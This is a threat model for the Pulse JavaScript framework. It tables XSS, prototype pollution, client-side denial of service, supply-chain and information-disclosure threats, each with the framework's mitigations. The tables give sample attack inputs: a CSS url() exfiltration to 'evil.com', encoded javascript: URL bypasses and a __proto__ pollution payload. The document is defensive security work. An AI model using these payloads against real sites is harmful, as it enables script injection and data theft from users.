# Threat Model - Pulse JS Framework

## Scope

This threat model covers the Pulse framework itself (not applications built with it). It identifies threats to the framework code, its APIs, and default behaviors.

## Trust Boundaries

```
┌─────────────────────────────────────────────────┐
│                    Browser                       │
│  ┌──────────────────────────────────────────┐   │
│  │           Pulse Application               │   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  │   │
│  │  │ runtime/ │  │compiler/│  │  cli/   │  │   │
│  │  │ (client) │  │ (build) │  │ (node)  │  │   │
│  │  └─────────┘  └─────────┘  └─────────┘  │   │
│  └──────────────────────────────────────────┘   │
│         ↕                ↕                       │
│  ┌──────────┐    ┌──────────────┐               │
│  │ User     │    │ External     │               │
│  │ Input    │    │ APIs/CDN     │               │
│  └──────────┘    └──────────────┘               │
└─────────────────────────────────────────────────┘
        ↕
┌──────────────┐
│   Server     │  (not in scope, but affects trust)
└──────────────┘
```

**Trust boundaries:**
1. User input → Pulse runtime (untrusted)
2. API responses → Pulse runtime (semi-trusted)
3. URL parameters → Router (untrusted)
4. npm packages → Build pipeline (supply chain)

## Threat Categories

### T1: Cross-Site Scripting (XSS)

#### T1.1 - Stored XSS via innerHTML

| Property | Value |
|----------|-------|
| **Threat** | Attacker stores malicious HTML that gets rendered via `innerHTML` |
| **Vector** | `element.innerHTML = apiData.content` |
| **Impact** | Session hijack, data theft, defacement |
| **Likelihood** | Medium (requires bypassing `el()` API) |
| **Mitigation** | `el()` uses `textContent`; `sanitizeHtml()` for rich content |
| **Status** | Mitigated by default |

#### T1.2 - XSS via javascript: URL

| Property | Value |
|----------|-------|
| **Threat** | Attacker injects `javascript:alert(1)` as URL |
| **Vector** | `el('a', { href: userUrl })` |
| **Impact** | Code execution in user context |
| **Likelihood** | Medium |
| **Mitigation** | `sanitizeUrl()` blocks javascript: protocol |
| **Status** | Mitigated (developer must call sanitizeUrl) |

#### T1.3 - XSS via event handler attribute

| Property | Value |
|----------|-------|
| **Threat** | Attacker sets `onclick` via `setAttribute` |
| **Vector** | `element.setAttribute('onclick', userCode)` |
| **Impact** | Code execution on interaction |
| **Likelihood** | Low (Pulse uses `on()` not setAttribute) |
| **Mitigation** | `safeSetAttribute()` blocks 85+ event handlers |
| **Status** | Mitigated by API design |

#### T1.4 - XSS via CSS expression/url

| Property | Value |
|----------|-------|
| **Threat** | Data exfiltration via CSS `url()` or code exec via `expression()` |
| **Vector** | `element.style.color = 'red; background: url(evil.com/steal?data=...')`  |
| **Impact** | Data leak, code execution (legacy IE) |
| **Likelihood** | Low |
| **Mitigation** | `sanitizeCSSValue()` blocks url(), expression(), semicolons |
| **Status** | Mitigated |

#### T1.5 - XSS via encoding bypass

| Property | Value |
|----------|-------|
| **Threat** | Attacker uses HTML entities/URL encoding to bypass protocol checks |
| **Vector** | `&#106;avascript:alert(1)` or `%6Aavascript:alert(1)` |
| **Impact** | Bypass URL sanitization |
| **Likelihood** | Medium |
| **Mitigation** | `sanitizeUrl()` decodes HTML entities, URL encoding, hex before checking |
| **Status** | Mitigated |

### T2: Prototype Pollution

#### T2.1 - __proto__ via JSON input

| Property | Value |
|----------|-------|
| **Threat** | Attacker sends `{"__proto__": {"isAdmin": true}}` |
| **Vector** | `Object.assign(state, JSON.parse(userJson))` |
| **Impact** | Property injection on all objects |
| **Likelihood** | Medium |
| **Mitigation** | `sanitizeObjectKeys()` blocks `__proto__`, `constructor`, `prototype` |
| **Status** | Mitigated (developer must use sanitizeObjectKeys) |

### T3: Client-Side Denial of Service

#### T3.1 - Query string bomb

| Property | Value |
|----------|-------|
| **Threat** | Extremely long URL query string causes parsing hang |
| **Vector** | `?a=x&b=x&c=x...` (thousands of params) |
| **Impact** | Client-side freeze |
| **Likelihood** | Low |
| **Mitigation** | Router limits: 2KB total, 50 params max, 1KB per value |
| **Status** | Mitigated |

#### T3.2 - Reactive loop (infinite effect)

| Property | Value |
|----------|-------|
| **Threat** | Effect triggers itself in infinite loop |
| **Vector** | `effect(() => { count.set(count.get() + 1) })` |
| **Impact** | Browser tab freeze |
| **Likelihood** | Medium (developer error) |
| **Mitigation** | Circular dependency limit (100 iterations) |
| **Status** | Mitigated |

#### T3.3 - Store nesting bomb

| Property | Value |
|----------|-------|
| **Threat** | Deeply nested object causes stack overflow |
| **Vector** | `store.$setState(deeplyNestedObj)` |
| **Impact** | Stack overflow crash |
| **Likelihood** | Low |
| **Mitigation** | Max nesting depth of 10 levels |
| **Status** | Mitigated |

### T4: Supply Chain

#### T4.1 - Vulnerable npm dependency

| Property | Value |
|----------|-------|
| **Threat** | Transitive dependency has known vulnerability |
| **Vector** | npm install pulls vulnerable package |
| **Impact** | Depends on vulnerability |
| **Likelihood** | N/A for runtime (zero deps) |
| **Mitigation** | Zero runtime dependencies; npm audit in CI for dev deps |
| **Status** | Mitigated by design |

### T5: Information Disclosure

#### T5.1 - Source maps in production

| Property | Value |
|----------|-------|
| **Threat** | Source maps expose original source code |
| **Vector** | `.map` files served in production |
| **Impact** | Code review, finding vulnerabilities |
| **Likelihood** | Medium |
| **Mitigation** | Build step should exclude source maps |
| **Status** | Developer responsibility |

#### T5.2 - Debug logging in production

| Property | Value |
|----------|-------|
| **Threat** | Console logs expose internal state |
| **Vector** | `logger.debug()` in production |
| **Impact** | Information leak |
| **Likelihood** | Low |
| **Mitigation** | `configureLogger({ production: true })` makes logger noop |
| **Status** | Mitigated |

#### T5.3 - DevTools in production

| Property | Value |
|----------|-------|
| **Threat** | `window.__PULSE_DEVTOOLS__` exposes internal state |
| **Vector** | `enableDevTools()` called in production |
| **Impact** | Full state inspection, time-travel |
| **Likelihood** | Low |
| **Mitigation** | Only call `enableDevTools()` in development |
| **Status** | Developer responsibility |

## Risk Summary

| ID | Threat | Severity | Status |
|----|--------|----------|--------|
| T1.1 | innerHTML XSS | Critical | Mitigated by default |
| T1.2 | javascript: URL | High | Mitigated (needs sanitizeUrl) |
| T1.3 | Event handler injection | High | Mitigated by API design |
| T1.4 | CSS injection | Medium | Mitigated |
| T1.5 | Encoding bypass | High | Mitigated |
| T2.1 | Prototype pollution | High | Mitigated (needs sanitizeObjectKeys) |
| T3.1 | Query string DoS | Low | Mitigated |
| T3.2 | Reactive loop | Medium | Mitigated |
| T3.3 | Store nesting bomb | Low | Mitigated |
| T4.1 | Supply chain | Medium | Mitigated (zero deps) |
| T5.1 | Source maps | Medium | Developer responsibility |
| T5.2 | Debug logging | Low | Mitigated |
| T5.3 | DevTools exposure | Low | Developer responsibility |
